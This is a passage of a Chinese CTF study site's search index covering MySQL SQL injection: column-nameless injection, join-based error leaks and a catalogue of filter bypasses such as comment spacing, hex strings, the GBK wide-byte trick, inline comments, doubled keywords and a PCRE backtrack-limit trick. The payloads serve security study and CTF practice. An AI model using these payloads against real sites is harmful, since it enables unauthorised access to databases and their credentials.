<p>\u4eceMYSQL5.5.8\u5f00\u59cb\uff0cInnoDB\u6210\u4e3a\u5176\u9ed8\u8ba4\u5b58\u50a8\u5f15\u64ce\u3002\u800c\u5728MYSQL5.6\u4ee5\u4e0a\u7684\u7248\u672c\u4e2d\uff0cinndb\u589e\u52a0\u4e86innodb_index_stats\u548cinnodb_table_stats\u4e24\u5f20\u8868\uff0c\u8fd9\u4e24\u5f20\u8868\u4e2d\u90fd\u5b58\u50a8\u4e86\u6570\u636e\u5e93\u548c\u5176\u6570\u636e\u8868\u7684\u4fe1\u606f\uff0c\u4f46\u662f\u6ca1\u6709\u5b58\u50a8\u5217\u540d\u3002</p> <p>2.sys\u6570\u636e\u5e93</p> <p>\u57285.7\u4ee5\u4e0a\u7684MYSQL\u4e2d\uff0c\u65b0\u589e\u4e86sys\u6570\u636e\u5e93\uff0c\u8be5\u5e93\u7684\u57fa\u7840\u6570\u636e\u6765\u81eainformation_schema\u548cperformance_chema\uff0c\u5176\u672c\u8eab\u4e0d\u5b58\u50a8\u6570\u636e\u3002\u53ef\u4ee5\u901a\u8fc7\u5176\u4e2d\u7684schema_auto_increment_columns\u6765\u83b7\u53d6\u8868\u540d\u3002</p> <pre><code>select table_name from mysql.innodb_index_stats \u8868\u540d\nselect database_name from mysql.innodb_index_stats \u5e93\u540d\nselect table_name from mysql.innodb_table_stats \u8868\u540d\nselect database_name from mysql.innodb_table_stats \u5e93\u540d\nPlain Text\n</code></pre> <p>\u4f46\u662f\u4e0a\u8ff0\u4e24\u79cd\u65b9\u6cd5\u90fd\u53ea\u80fd\u67e5\u51fa\u8868\u540d\uff0c\u65e0\u6cd5\u67e5\u5230\u5217\u540d\uff0c\u8fd9\u65f6\u6211\u4eec\u5c31\u8981\u7528\u5230\u65e0\u5217\u540d\u6ce8\u5165\u4e86\u3002\u65e0\u5217\u540d\u6ce8\u5165\uff0c\u987e\u540d\u601d\u4e49\uff0c\u5c31\u662f\u4e0d\u9700\u8981\u5217\u540d\u5c31\u80fd\u6ce8\u51fa\u6570\u636e\u7684\u6ce8\u5165\u3002</p> <p>\u5728\u53d6\u522b\u540d\u7684\u540c\u65f6\u67e5\u8be2\u6570\u636e\u3002</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u73b0\u5728\u6709\u4e00\u4e2a\u53ebxxx\u7684\u8868\uff0c\u8fd9\u4e2a\u8868\u6709\u4e09\u5217\uff0c\u5217\u540d\u5206\u522b\u4e3aid,user,password\u3002\u6b64\u65f6\uff0c\u6211\u4eec\u7528\u65e0\u5217\u540d\u67e5\u8be2\u7684\u65b9\u5f0f\u6765\u67e5\u4e00\u4e0b\u8868\u4e2d\u6570\u636e\u3002</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u6b64\u65f6\u5f97\u5230\u4e86\u4e00\u4e2a\u865a\u62df\u8868\uff0c\u5217\u540d\u5206\u522b\u4e3a1\uff0c2\uff0c3\uff0c\u5176\u4e2d\u5b58\u50a8\u4e86xxx\u8868\u4e2d\u7684\u6240\u6709\u6570\u636e\u3002</p> <p>\u6ce8\uff1a\u8fdb\u884c\u67e5\u8be2\u65f6\u8bed\u53e5\u7684\u5b57\u6bb5\u6570\u5fc5\u987b\u548c\u6307\u5b9a\u8868\u4e2d\u7684\u5b57\u6bb5\u6570\u4e00\u6837\uff0c\u4e0d\u80fd\u591a\u4e5f\u4e0d\u80fd\u5c11\uff0c\u4e0d\u7136\u5c31\u4f1a\u62a5\u9519</p> <p></p> <p>\u6211\u4eec\u8fdb\u884c\u65e0\u5217\u540d\u6ce8\u5165\u5c31\u662f\u5229\u7528\u4e86\u8be5\u65b9\u6cd5\uff0c\u901a\u8fc7\u65e0\u5217\u540d\u67e5\u8be2\u6784\u9020\u4e00\u4e2a\u865a\u62df\u8868\uff0c\u5728\u6784\u9020\u6b64\u8868\u7684\u540c\u65f6\u67e5\u8be2\u5176\u4e2d\u7684\u6570\u636e\u3002</p> <p></p> <p>\u50cf\u8fd9\u6837\u5c31\u53ef\u4ee5\u67e5\u8be2\u7b2c\u4e8c\u5217\u7684\u6570\u636e\uff0c\u5728\u865a\u62df\u8868\u4e2d\uff0c\u5217\u540d\u90fd\u662f1\uff0c2\uff0c3\uff0c\u6240\u4ee5\u6211\u4eec\u5728\u67e5\u8be2\u8bed\u53e5\u4e2d\u8981\u7528 <code>2</code> \u800c\u4e0d\u80fd\u76f4\u63a5\u7528 2 \u3002\u672b\u5c3e\u7684 n \u662f\u7528\u6765\u547d\u540d\u7684\uff0c\u4e5f\u53ef\u4ee5\u662f\u5176\u4ed6\u5b57\u7b26\u3002\u4e0d\u8fc7\u6709\u65f6\u5019 ` \u4e5f\u4f1a\u88ab\u8fc7\u6ee4\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u53c8\u8981\u7528\u5230\u53d6\u522b\u540d\u7684\u64cd\u4f5c\u4e86\u3002</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u6b64\u65f6\u6784\u9020\u7684\u865a\u62df\u8868\u7684\u5217\u540d\u5c31\u5206\u522b\u662fa,b,c\u4e86\u3002\u6b64\u65f6\u67e5\u8be2\u5c31\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7a\uff0cb\uff0cc\u6765\u67e5\u3002</p> <p></p> <pre><code>select 1,2,3 union select * from sc;select `1` from (select 1,2,3 union select * from sc)a;select `2` from (select 1,2,3 union select * from sc)a;\nSQL\n</code></pre>"},{"location":"web/sql/SQL_Injection/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/#_3","title":"\u65e0\u5217\u540d\u6ce8\u5165","text":""},{"location":"web/sql/SQL_Injection/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/#join","title":"join","text":"<p>\u6b64join\u975e\u5f7cjoin\uff08\u6697\u793assti\u91cc\u9762\u7684join\u8fc7\u6ee4\u5668\uff09</p> <p>\u4e00\u822c\u4e5f\u7528\u8fd9\u4e2ajoin\u6765\u7ed5\u8fc7information_schema</p> <p>\u8bb2\u5b9e\u8bdd\u5e94\u8be5\u653e\u5230\u62a5\u9519\u6ce8\u5165\u91cc\u9762\u7684\u3002</p> <p>\u5229\u7528\u539f\u7406\u662f\u5217\u540d\u91cd\u590d</p> <p>select*from(selecta.1frommysql.user ajoinmysql.user b)c</p> <p></p> <p>\u67e5\u770b\u62a5\u9519\u4fe1\u606f\u3002</p> <p>\u518d\u7ed9\u4e00\u4e2a\uff1a</p> <pre><code>select * from user where id = -1 union all select * from (select * fromuser as a join user as b)as c;\nPlain Text\n</code></pre> <p></p> <p>\u62a5\u9519\u51fa\u5217\u540d\u3002</p> <pre><code> select * from user where id = -1union all select*from (select * from user as a join user b using(id,username,passwd,phone))c;\nPlain Text\n</code></pre> <p>\u540c\u6837\u7684\u4e5f\u53ef\u4ee5\u7ee7\u7eed\u53bb\u5229\u7528\uff0c\u7136\u540e\u8bfb\u53d6\u5b57\u6bb5</p> <p></p> <p>\u4f8b\u9898</p> <p>SWPU2019 web1\u7684wp\u3002</p>"},{"location":"web/sql/SQL_Injection/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/#_4","title":"\u65e0\u5217\u540d\u6ce8\u5165","text":"<p>\u653e\u51e0\u5f20\u81ea\u5df1\u5b9e\u9a8c\u7684\u7ed3\u679c\uff1a</p> <p></p> <p></p>"},{"location":"web/sql/SQL_Injection/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/","title":"\u8054\u5408\u67e5\u8be2","text":"<p>union select \u7684\u7528\u6cd5\u548c\u6027\u8d28\u5c31\u4e0d\u5728\u6b64\u8d58\u8ff0</p> <p>\u8fd9\u91cc\u662f\u6211\u7b14\u8bb0\u4e2d\u7684\u4e00\u4e2a\u6027\u8d28\uff0c\u5f88\u9057\u61be\uff0c\u6211\u6ca1\u6709\u8bb0\u5f55\u4f8b\u9898</p>"},{"location":"web/sql/SQL_Injection/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/#_2","title":"\u8054\u5408\u67e5\u8be2\u5e76\u4e0d\u5b58\u5728\u7684\u6570\u636e\u65f6\uff0c\u8054\u5408\u67e5\u8be2\u5c31\u4f1a\u6784\u9020\u4e00\u4e2a\u865a\u62df\u7684\u6570\u636e\u3002","text":"<p>\u6709\u4e0a\u9762\u8fd9\u6837\u4e00\u53e5\u8bdd</p> <p>\u6b63\u5e38\uff1a</p> <p></p> <p>\u5c06\u7b2c\u4e00\u4e2a\u53c2\u6570\u6539\u4e3a\u6570\u636e\u5e93\u4e2d\u4e0d\u5b58\u5728\u7684\u503c\uff1a</p> <p></p> <p>\u56e0\u4e3aaaa\u5e76\u4e0d\u5b58\u5728\u6570\u636e\u5e93\u4e2d\uff0c\u8be5\u67e5\u8be2\u4ec5\u8fd4\u56de\u8fde\u4e2a\u67e5\u8be2\u7684\u7b2c\u4e8c\u4e2a\u67e5\u8be2\uff0c\u53ef\u4ee5\u770b\u5230\uff0c\u8fd9\u91cc\u7684passwd\u5b57\u6bb5\u662f\u6211\u4eec\u53ef\u63a7\u7684\uff0c\u800c\u7528\u6237\u8f93\u5165\u7684password\u4e5f\u662f\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u3002</p> <p>\u591a\u8bf4\u4e00\u70b9\uff1a\u6211\u8bb0\u5f97\u901a\u8fc7\u8fd9\u4e2a\u6027\u8d28\u53ef\u4ee5\u8fbe\u5230\u4fee\u6539\u865a\u62df\u8868\u4e2d\u7684\u6570\u636e\uff0c\u7136\u540e\u5982\u679c\u540e\u53f0\u8bed\u53e5\u4f7f\u7528\u8054\u5408\u67e5\u8be2\u6765\u8fdb\u884c\u64cd\u4f5c\u5904\u7406\u65f6\uff0c\u76f8\u5f53\u4e8e\u5b83\u6240\u4f7f\u7528\u7684\u8868\u4e2d\u53c2\u6570\u5df2\u7ecf\u53ef\u4ee5\u88ab\u6211\u4eec\u63a7\u5236\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u8fd9\u4e2a\u865a\u62df\u8868\u6570\u636e\u6765\u8fdb\u884c\u8ba4\u8bc1\u3002</p>"},{"location":"web/sql/SQL_Injection/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/#_3","title":"\u8054\u5408\u67e5\u8be2\u793a\u4f8b","text":""},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/","title":"SQL\u6ce8\u5165\u7ed5\u8fc7\u59ff\u52bf","text":"<p>sql\u6ce8\u5165\u7684\u539f\u7406\u4e86\u89e3\u4e86\u4e2a\u5927\u6982\u5176\u5b9e\u4e5f\u5c31\u5dee\u4e0d\u591a\u4e86\uff0c\u8fd9\u4e2a\u6a21\u5757\u662f\u59ff\u52bf\u591a\uff0c\u4f46\u662f\u6f0f\u6d1e\u81ea\u8eab\u5e94\u8be5\u5e76\u6ca1\u6709\u4ec0\u4e48\u7279\u522b\u503c\u5f97\u6316\u6398\u7684\u5730\u65b9\uff08\u5982\u679c\u6709\u7684\u8bdd\uff1a\u6c38\u8fdc\u4e0d\u8981\u76f8\u4fe1\u7528\u6237\u7684\u8f93\u5165\uff01\uff01\uff01\uff09\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e9b\u8fdb\u9636\u7684\u59ff\u52bf\uff0c\u672c\u4eba\u80fd\u529b\u6709\u9650\uff0c\u5982\u679c\u53d1\u73b0\u65b0\u59ff\u52bf\u968f\u65f6\u6b22\u8fce\u4ea4\u6d41\u5199\u5165\uff1a</p>"},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#1-a0","title":"1.\u7ed5\u8fc7\u7a7a\u683c\uff08\u6ce8\u91ca\u7b26/ /\uff0c%a0\uff09","text":"<p>\u76f4\u63a5\u6765\u770b\u59ff\u52bf\u597d\u4e86</p> <pre><code>\u4e24\u4e2a\u7a7a\u683c\u4ee3\u66ff\u4e00\u4e2a\u7a7a\u683c\uff0c\u7528Tab\u4ee3\u66ff\u7a7a\u683c\uff0c%a0=\u7a7a\u683c%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/\u5176\u4e2d%09\u9700\u8981php\u73af\u5883\uff0c%0a\u4e3a\\n/!select/\u4e3amysql\u72ec\u6709\u3002\u5e38\u89c1\u7528\u6cd5\u4e3a/!50727select 1/\uff0c\u5373\u5f53\u7248\u672c\u53f7\u5c0f\u4e8e\u7b49\u4e8e50727\u65f6\u6267\u884cselect 1\u5176\u5b9e/**/\u4e5f\u5c31\u662f\u6ce8\u91ca\u6cd5\u662f\u7528\u7684\u6700\u591a\u7684select/**/schema_name/**/from/**/information_schema.schemata\u66ff\u6362\u4e00\u4e0b\uff0c\u95ee\u9898\u4e0d\u5927\u3002\nPlain Text\n</code></pre> <p>\u4e0a\u9762\u7684\u90fd\u662f\u66ff\u6362\uff0c\u7136\u540e</p> <p>\u5728MySQL\u4e2d\uff0c\u62ec\u53f7\u662f\u7528\u6765\u5305\u56f4\u5b50\u67e5\u8be2\u7684\u3002\u56e0\u6b64\uff0c\u4efb\u4f55\u53ef\u4ee5\u8ba1\u7b97\u51fa\u7ed3\u679c\u7684\u8bed\u53e5\uff0c\u90fd\u53ef\u4ee5\u7528\u62ec\u53f7\u5305\u56f4\u8d77\u6765\u3002\u800c\u62ec\u53f7\u7684\u4e24\u7aef\uff0c\u53ef\u4ee5\u6ca1\u6709\u591a\u4f59\u7684\u7a7a\u683c\u3002</p> <pre><code>select(user())from dual where(1=1)and(ha2=2)\nPlain Text\n</code></pre> <p>\u6628\u5929\u5728\u7fa4\u91cc\u9762py\u7684[0xfor x in [1,2,3]]\u8fd4\u56de15\u662f\u4e0d\u662f\u4e5f\u5dee\u4e0d\u591a\u7684\u611f\u89c9\u3002</p>"},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#2","title":"2.\u7ed5\u8fc7\u5355\u5f15\u53f7","text":"<p>\u8fd9\u4e2a\u8fc7\u6ee4\u7684\u8bdd\u4f1a\u6bd4\u8f83\u5934\u75bc\uff0c\u4f46\u4e5f\u4e0d\u662f\u5b8c\u5168\u6ca1\u6709\u529e\u6cd5</p> <pre><code>select column_name  from information_schema.tables where table_name=\"users\"\u3000users\u7684\u5341\u516d\u8fdb\u5236\u7684\u5b57\u7b26\u4e32\u662f7573657273\u3002\u90a3\u4e48\u6700\u540e\u7684sql\u8bed\u53e5\u5c31\u53d8\u4e3a\u4e86select column_name  from information_schema.tables where table_name=0x7573657273\u53c8\u6216\u8005\u662f\u4e0b\u9762\u7684%bf%270xbf27\u4e0d\u662f\u6709\u4e00\u4e2a\u6709\u6548\u7684GBK\u5b57\u7b26\uff0c\u4f46\u662f\u7ecf\u8fc7addslashed()\u8f6c\u6362\u540e\u5c31\u53d8\u62100xbf5c27,0xbf5c\u662f\u4e2a\u6709\u6548\u7684GBK\u5b57\u7b26\uff0c\u6240\u4ee50xbf5c27\u4f1a\u5f53\u4f5c\u4e00\u4e2a\u5b57\u7b260xbf5c\u548c\u4e00\u4e2a\u5355\u7ef0\u53f7\u6765\u5904\u7406\uff0c\u7ed3\u679c\u662f\u8ddf\u5728\u5f15\u53f7\u540e\u67e5\u8be2\u8bed\u53e5\u5f97\u5230\u4e86\u6267\u884c\u3002\u5728phpcms2007\u7a0b\u5e8f\u91cc\u7531\u591a\u5b57\u8282\u7f16\u7801\u6f0f\u6d1e\u5f15\u53d1\u7684\u6f0f\u6d1e\u6709\u591a\u4e2a\uff0c\u4ee5area.php\u6587\u4ef6\u91cc\u7684\u6f0f\u6d1e\u6765\u4f5c\u6d4b\u8bd5\u3002\u6240\u4ee5\u8fd9\u4e2a\u8981\u6c42\u5c31\u76f8\u5bf9\u6765\u8bf4\u6bd4\u8f83\u9ad8\u4e86\u3002\u9700\u8981\u6709addslashed()\u8fd9\u4e2a\u8fc7\u6ee4\u51fd\u6570\nPlain Text\n</code></pre> <p>\u9664\u4e86\u4e0a\u9762\u7684\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528\u8f6c\u4e49\u7b26\\</p> <p>\u81f3\u4e8e\u539f\u7406\uff1f\u4ee5\u4e0b\u9762\u7684\u4e3a\u4f8b\u5b57\uff0c\u4f46\u4e0d\u505a\u8fc7\u591a\u89e3\u91ca(\u7b2c6\u884c\u6211\u662f\u6545\u610f\u6362\u7684\u884c)</p> <pre><code>select * from user_table where username=' username ' and password='  password '\nselect * from user_table where username='username\\' and password =' and union select xxx\nPlain Text\n</code></pre>"},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#3","title":"3.\u9017\u53f7\u7ed5\u8fc7","text":"<p>\u5728\u4f7f\u7528\u76f2\u6ce8\u7684\u65f6\u5019\uff0c\u9700\u8981\u4f7f\u7528\u5230substr(),mid(),limit\u3002\u8fd9\u4e9b\u5b50\u53e5\u65b9\u6cd5\u90fd\u9700\u8981\u4f7f\u7528\u5230\u9017\u53f7\u3002\u5bf9\u4e8esubstr()\u548cmid()\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u4f7f\u7528<code>from to</code>\u7684\u65b9\u5f0f\u6765\u89e3\u51b3\uff1a</p> <pre><code>select substr(database() from 1 for 1);select mid(database() from 1 for 1);\nPlain Text\n</code></pre> <p>\u4f7f\u7528join\uff1a</p> <pre><code>union select 1,2     #\u7b49\u4ef7\u4e8eunion select * from (select 1)a join (select 2)b\nPlain Text\n</code></pre> <p>\u4f7f\u7528like\uff1a</p> <pre><code>select ascii(mid(user(),1,1))=80   #\u7b49\u4ef7\u4e8eselect user() like 'r%'\nPlain Text\n</code></pre> <p>\u5bf9\u4e8e<code>limit</code>\u53ef\u4ee5\u4f7f\u7528<code>offset</code>\u6765\u7ed5\u8fc7\uff1a</p> <pre><code>select * from news limit 0,1# \u7b49\u4ef7\u4e8e\u4e0b\u9762\u8fd9\u6761SQL\u8bed\u53e5select * from news limit 1 offset 0\nPlain Text\n</code></pre>"},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#5sqlmap","title":"5.\u6bd4\u8f83\u7b26\u53f7\uff08&lt;&gt;\uff09\u7ed5\u8fc7\uff08\u8fc7\u6ee4\u4e86&lt;&gt;\uff1asqlmap\u76f2\u6ce8\u7ecf\u5e38\u4f7f\u7528&lt;&gt;\uff09","text":"<pre><code>\u4f7f\u7528greatest()\u3001least\uff08\uff09\uff1a\uff08\u524d\u8005\u8fd4\u56de\u6700\u5927\u503c\uff0c\u540e\u8005\u8fd4\u56de\u6700\u5c0f\u503c\uff09#\n\n\u540c\u6837\u662f\u5728\u4f7f\u7528\u76f2\u6ce8\u7684\u65f6\u5019\uff0c\u5728\u4f7f\u7528\u4e8c\u5206\u67e5\u627e\u7684\u65f6\u5019\u9700\u8981\u4f7f\u7528\u5230\u6bd4\u8f83\u64cd\u4f5c\u7b26\u6765\u8fdb\u884c\u67e5\u627e\u3002\u5982\u679c\u65e0\u6cd5\u4f7f\u7528\u6bd4\u8f83\u64cd\u4f5c\u7b26\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u4f7f\u7528\u5230greatest\u6765\u8fdb\u884c\u7ed5\u8fc7\u4e86\u3002\n\u6700\u5e38\u89c1\u7684\u4e00\u4e2a\u76f2\u6ce8\u7684sql\u8bed\u53e5\uff1a\nselect * from users where id=1 and ascii(substr(database(),0,1))&gt;64\n\u6b64\u65f6\u5982\u679c\u6bd4\u8f83\u64cd\u4f5c\u7b26\u88ab\u8fc7\u6ee4\uff0c\u4e0a\u9762\u7684\u76f2\u6ce8\u8bed\u53e5\u5219\u65e0\u6cd5\u4f7f\u7528,\u90a3\u4e48\u5c31\u53ef\u4ee5\u4f7f\u7528greatest\u6765\u4ee3\u66ff\u6bd4\u8f83\u64cd\u4f5c\u7b26\u4e86\u3002greatest(n1,n2,n3,...)\u51fd\u6570\u8fd4\u56de\u8f93\u5165\u53c2\u6570(n1,n2,n3,...)\u7684\u6700\u5927\u503c\u3002\n\u90a3\u4e48\u4e0a\u9762\u7684\u8fd9\u6761sql\u8bed\u53e5\u53ef\u4ee5\u4f7f\u7528greatest\u53d8\u4e3a\u5982\u4e0b\u7684\u5b50\u53e5:\nselect * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64\n\u4f7f\u7528between and\uff1a\n#\nbetween a and b\uff1a\nbetween 1 and 1; \u7b49\u4ef7\u4e8e =1\nPlain Text\n</code></pre>"},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#6or-and-xor-not","title":"6.or and xor not\u7ed5\u8fc7\uff1a","text":"<pre><code>and=&amp;&amp;  or=||   xor=|   not=!\nPlain Text\n</code></pre>"},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#7-","title":"7.\u7ed5\u8fc7\u6ce8\u91ca\u7b26\u53f7\uff08#\uff0c--(\u540e\u9762\u8ddf\u4e00\u4e2a\u7a7a\u683c\uff09\uff09\u8fc7\u6ee4","text":"<pre><code>id=1' union select 1,2,3||'1\u3000\u6700\u540e\u7684or '1\u95ed\u5408\u67e5\u8be2\u8bed\u53e5\u7684\u6700\u540e\u7684\u5355\u5f15\u53f7\uff08\u8fd8\u662f\u7275\u626f\u5230\u4e00\u4e9bor\uff0c\u548cc\u8bed\u8a00\u4e00\u6837\uff0c\u524d\u9762\u7684\u9519\u4e86\u518d\u8bf4\uff09\u6216\u8005\uff1a\nid=1' union select 1,2,'3\nPlain Text\n</code></pre>"},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#8","title":"8.=\u7ed5\u8fc7","text":"<pre><code>\u4f7f\u7528like \u3001rlike \u3001regexp \u6216\u8005 \u4f7f\u7528&lt; or &gt;\nPlain Text\n</code></pre>"},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#9union-selectwhere","title":"9.\u7ed5\u8fc7union select\uff0cwhere\u7b49","text":"<pre><code>\uff081\uff09\u4f7f\u7528\u6ce8\u91ca\u7b26\u7ed5\u8fc7\uff1a#\n\u5e38\u7528\u6ce8\u91ca\u7b26\uff1a\uff08\u8d85\u5f3a\u7684\u6ce8\u91ca\uff01\uff09\n//\uff0c-- , /**/, #, --+, -- -, ;,%00,--a\n\u7528\u6cd5\uff1a\nU/**/ NION /**/ SE/**/ LECT /**/user\uff0cpwd from user\n\uff082\uff09\u4f7f\u7528\u5927\u5c0f\u5199\u7ed5\u8fc7\uff1a#\nid=-1'UnIoN/**/SeLeCT\n\uff083\uff09\u5185\u8054\u6ce8\u91ca\u7ed5\u8fc7\uff1a#\nid=-1'/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#\n\uff084\uff09 \u53cc\u5173\u952e\u5b57\u7ed5\u8fc7\uff08\u82e5\u5220\u9664\u6389\u7b2c\u4e00\u4e2a\u5339\u914d\u7684union\u5c31\u80fd\u7ed5\u8fc7\uff09\uff1a#\nid=-1'UNIunionONSeLselectECT1,2,3\u2013-\nPlain Text\n</code></pre> <p>\u6700\u540e\u4e00\u4e2a\u662f\u67d0\u9053\u539f\u9898\uff0c\u975e\u5e38\u62b1\u6b49\u5fd8\u8bb0\u5728\u54ea\u4e86\u3002</p>"},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#10","title":"10.\u901a\u7528\u7ed5\u8fc7\uff08\u7f16\u7801\uff09","text":"<p>\u5982URLEncode\u7f16\u7801\uff0cASCII,HEX,unicode\u7f16\u7801\u7ed5\u8fc7\uff1a</p> <pre><code>or 1=1\u5373%6f%72%20%31%3d%31\uff0c\u800cTest\u4e5f\u53ef\u4ee5\u4e3aCHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)\u3002\nPlain Text\n</code></pre>"},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#11","title":"11.\u7b49\u4ef7\u51fd\u6570\u7ed5\u8fc7","text":"<pre><code>hex()\u3001bin() ==&gt; ascii()[ord()?]\nsleep() ==&gt;benchmark()\nconcat_ws()==&gt;group_concat()\nmid()\u3001substr() ==&gt; substring()\n@@user ==&gt; user()\n@@datadir ==&gt; datadir()\n\u4e3e\u4f8b\uff1asubstring()\u548csubstr()\u65e0\u6cd5\u4f7f\u7528\u65f6\uff1a?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74\n\u6216\u8005\uff1asubstr((select 'password'),1,1) = 0x70strcmp(left('password',1), 0x69) = 1strcmp(left('password',1), 0x70) = 0strcmp(left('password',1), 0x71) = -1\nPlain Text\n</code></pre>"},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#12pcre","title":"12.PCRE\u7ed5\u8fc7","text":"<pre><code>union/*'+'a'*1000001+'*/select\nPlain Text\n</code></pre> <p>\u8fd9\u4e2a\u539f\u7406\u6211\u4e00\u5b9a\u4f1a\u6709\u673a\u4f1a\u4ecb\u7ecd\u7684\u3002</p> <p>\u7a0d\u5fae\u89e3\u91ca\uff1apcre\u6709\u5339\u914d\u4e0a\u9650\u7684\u9650\u5236\uff0c\u503c\u4e3a1000000\uff0c\u5e76\u4e14\u5339\u914d\u8bed\u53e5\uff08preg\u51fd\u6570\uff09\u4e2d\u5fc5\u987b\u8981\u6709\u4e00\u4e2a.\u8fd9\u6837\u5728\u5339\u914d\u65f6\u4ed6\u78b0\u5230\u8fd9\u4e2a\u5c31return\uff08\u6709\u70b9\u50cf\u9012\u5f52\uff09\u4e00\u6b21\uff0c\u8d85\u8fc7\u4e00\u767e\u4e07\u6b21\u540e\u51fd\u6570\u5931\u6548\u3002</p> <p>sql\u6ce8\u5165\u4e2d\u6211\u6682\u65f6\u7684\u6ca1\u9047\u89c1\u8fc7\uff0c\u6240\u4ee5\u8fd9\u4e2a10000001\u6211\u4e5f\u4e0d\u592a\u61c2\uff08+1\u662f\u5e72\u561b\u7684\uff09\u3002</p>"},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#13with-rollup","title":"13.WITH ROLLUP\u7ed5\u8fc7","text":"<p>\u4e0d\u89e3\u91ca\u4e86</p> <p>\u5b9e\u9a8c\u5427  \u56e0\u7f3a\u601d\u6c40\u7684\u7ed5\u8fc7  By  Assassin\uff08with rollup\u7edf\u8ba1\uff09_Assassin-CSDN\u535a\u5ba2</p> 